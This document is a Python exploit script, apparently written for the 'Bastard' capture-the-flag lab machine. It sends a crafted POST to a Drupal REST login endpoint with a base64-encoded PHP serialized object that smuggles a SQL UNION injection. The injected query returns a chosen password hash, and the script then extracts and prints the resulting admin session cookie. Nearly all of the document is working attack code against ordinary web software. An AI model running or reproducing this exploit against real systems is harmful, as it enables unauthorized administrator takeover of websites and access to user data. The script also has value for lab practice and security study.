#!/usr/bin/env python
# ===================================
# Bastard Exploit by zc00l
# ===================================
import re
import socket
import base64
from sockclient import *

target = "10.10.10.9"
port = 80
rest_endpoint = "/rest"
payload = str()
header = """POST /{0}/user/login HTTP/1.1
Host: {1}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/vnd.php.serialized
Cookie: Drupal.toolbar.collapsed=0; has_js=1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 833

""".format(rest_endpoint, target)

data = base64.b64decode("""YToyOntzOjg6InVzZXJuYW1lIjtPOjE5OiJTZWxlY3RRdWVyeUV4dGVuZGVyIjo0OntzOjg6IgAqAHF1ZXJ5IjtPOjE3OiJEYXRhYmFzZUNvbmRpdGlvbiI6NTp7czoxMzoiACoAY29uZGl0aW9ucyI7YToxOntzOjEyOiIjY29uanVuY3Rpb24iO3M6MzoiQU5EIjt9czoxMjoiACoAYXJndW1lbnRzIjthOjA6e31zOjEwOiIAKgBjaGFuZ2VkIjtiOjA7czoyOToiACoAcXVlcnlQbGFjZWhvbGRlcklkZW50aWZpZXIiO047czoxMzoic3RyaW5nVmVyc2lvbiI7czo0Mzk6IjB4M2EpIFVOSU9OIFNFTEVDVCB1eC51aWQgYXMgdWlkLCB1eC5uYW1lIEFTIG5hbWUsICckUyREMk5ILjZJWk5iMXZiWkVWMUYwUzlmcUl6M0EwWTF4dWVLem5COHZXck1zblYvbnJUcG5kJyBBUyBwYXNzLCB1eC5tYWlsIEFTIG1haWwsIHV4LnRoZW1lIEFTIHRoZW1lLCB1eC5wYXNzIEFTIHNpZ25hdHVyZSwgdXguc2lnbmF0dXJlX2Zvcm1hdCBhcyBzaWduYXR1cmVfZm9ybWF0LCB1eC5jcmVhdGVkIGFzIGNyZWF0ZWQsIHV4LmFjY2VzcyBBUyBhY2Nlc3MsIHV4LmxvZ2luIEFTIGxvZ2luLCB1eC5zdGF0dXMgQVMgc3RhdHVzLCB1eC50aW1lem9uZSBBUyB0aW1lem9uZSwgdXgubGFuZ3VhZ2UgQVMgbGFuZ3VhZ2UsIHV4LnBpY3R1cmUgQVMgcGljdHVyZSwgdXguaW5pdCBBUyBpbml0LCB1eC5kYXRhIEFTIGRhdGEgRlJPTSB7dXNlcnN9IHV4IFdIRVJFIHV4LnVpZDw+KDAiO31zOjE5OiIAKgB1bmlxdWVJZGVudGlmaWVyIjtzOjg6ImFueXRoaW5nIjtzOjEzOiIAKgBjb25uZWN0aW9uIjtOO3M6MTQ6IgAqAHBsYWNlaG9sZGVyIjtpOjA7fXM6ODoicGFzc3dvcmQiO3M6MTA6Im91dnJlYm9pdGUiO30=""").decode() + "\r\n\r\n"
payload += header
payload += data

# print(payload)
s = SockClient(dest=target, port=port, verbose=False)
s.send(payload)
response = s.recv()
print("Response length: %d" % len(response))
print("Parsing cookie from response ...")
regex = "Set-Cookie: (?P<cookie_name>[a-zA-Z0-9]+)=(?P<cookie_value>[a-zA-Z0-9\-_]+); expires=(?P<expire>[a-zA-Z0-9\s\-\.,\:]+); path=(?P<path>[a-zA-Z0-9\/]+)"
match = re.findall(regex, response)
if not match:
    print("Could not parse cookie data. Dumping to the screen")
    print(response)

cookie = match[0]
print("Admin session cookie printrmation: ")
print("Name: %s".rjust(15) % cookie[0])
print("Value: %s".rjust(15) % cookie[1])
print("Domain: %s".rjust(15) % target)
print("Path: %s".rjust(15) % cookie[3])
print("Expire: %s".rjust(15) % cookie[2])

